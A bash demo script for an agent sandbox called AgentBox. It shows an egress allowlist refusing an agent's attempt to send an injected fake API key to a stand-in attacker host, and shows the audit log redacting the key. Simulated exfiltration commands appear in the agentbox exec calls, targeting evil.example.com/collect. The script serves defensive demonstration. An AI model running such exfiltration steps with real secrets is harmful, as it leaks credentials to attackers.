#!/usr/bin/env bash
#
# AgentBox blocked-exfiltration demo — recordable with asciinema.
#
#   asciinema rec exfil.cast --idle-time-limit 1.5 --cols 92 --rows 30 \
#     -c demo/exfil-demo.sh
#
# The story (≈60s): an agent you don't fully trust is holding a live API key.
# AgentBox injects the key so the agent can do real work against ONE allowed
# API — then proves the key has nowhere to leak: the attacker host is refused at
# the egress proxy (fail closed), and even when the agent dumps the key into its
# own output, the permanent audit record scrubs it. Everything is real — real
# Docker, real egress proxy, real secret redaction, no mocks.
#
# Requirements: docker running, and `agentbox` on PATH (override with
# AGENTBOX=/path/to/agentbox). The stub runtime image is built automatically.

set -uo pipefail

# --- resolve agentbox + repo root, build the stub image if missing -----------
AGENTBOX_BIN="${AGENTBOX:-agentbox}"
agentbox() { command "$AGENTBOX_BIN" "$@"; } # so the prompt always shows "agentbox"
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

if ! command -v "$AGENTBOX_BIN" >/dev/null 2>&1 && [ ! -x "$AGENTBOX_BIN" ]; then
	echo "error: 'agentbox' not found on PATH (set AGENTBOX=/path/to/agentbox)" >&2
	exit 1
fi
if ! docker info >/dev/null 2>&1; then
	echo "error: Docker is not running" >&2
	exit 1
fi
if ! docker image inspect agentbox/stub-agent:latest >/dev/null 2>&1; then
	echo "building agentbox/stub-agent:latest (one-time)…" >&2
	docker build -q -t agentbox/stub-agent:latest \
		-f "$REPO_ROOT/examples/agents/stub.Dockerfile" "$REPO_ROOT/examples/agents" >/dev/null
fi

# --- presentation helpers (typing effect, no external deps) ------------------
GREEN=$'\033[1;32m'; CYAN=$'\033[1;36m'; DIM=$'\033[2m'; RST=$'\033[0m'
TYPE=${TYPE:-0.018}; HOLD=${HOLD:-1.3}

pc() { printf '%s# %s%s\n' "$CYAN" "$1" "$RST"; sleep 0.9; }          # comment
pe() {                                                                # type + run
	printf '%s$%s ' "$GREEN" "$RST"
	local s=$1 i
	for ((i = 0; i < ${#s}; i++)); do printf '%s' "${s:i:1}"; sleep "$TYPE"; done
	printf '\n'; sleep 0.35
	eval "$s"
	sleep "$HOLD"
}

# --- the demo ----------------------------------------------------------------
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
cd "$WORK"
git init -q && git config user.email demo@agentbox.dev && git config user.name demo
echo "build" > Makefile && git add -A && git commit -q -m init

cat > agentbox.yaml <<'YAML'
runtime:
  isolation: container
  image: agentbox/stub-agent:latest
network:
  mode: allowlist          # ENFORCED, not advisory
  allow:
    - github.com           # the ONLY domain this sandbox may reach
secrets:
  allow:
    - AGENTBOX_FAKE_API_KEY # injected into the agent; never on the host logs
YAML

# A fake key, injected at runtime from the host env (never baked into the image).
export AGENTBOX_FAKE_API_KEY="sk-DEMO-fake-key-not-real-1234567890"

clear
pc "An agent you don't fully trust is holding a live API key. Can it leak it?"
pc "Policy: one allowed domain, and a key injected into the sandbox:"
pe "cat agentbox.yaml"

pc "The key really is inside the sandbox (the value is never printed):"
pe "agentbox exec 'test -n \"\$AGENTBOX_FAKE_API_KEY\" && echo \"agent holds a live API key\"'"

pc "Your one allowed API stays reachable — real work still flows:"
pe "agentbox exec 'git ls-remote https://github.com/git/git.git HEAD | head -1'"

pc "Now it tries to smuggle the key to an attacker — refused at the proxy, fail closed:"
pe "agentbox exec 'git ls-remote https://evil.example.com/collect HEAD'" || true

pc "The blocked attempt is in the audit trail:"
pe "agentbox session show latest | grep -E 'BLOCKED egress'"

pc "And if the agent dumps the key into its own output, the saved record scrubs it:"
pe "agentbox exec 'echo \"POST /collect key=\$AGENTBOX_FAKE_API_KEY\"' >/dev/null 2>&1"
pe "grep -h 'POST /collect' .agentbox/sessions/*/logs.txt | tail -1"
pe "grep -rl 'sk-DEMO-fake-key' .agentbox/sessions/ || echo '  → raw key never written to disk ✓'"

printf '\n%sThe agent uses your key — and has nowhere to leak it.  github.com/qosikz/agentbox%s\n' "$DIM" "$RST"
sleep 2
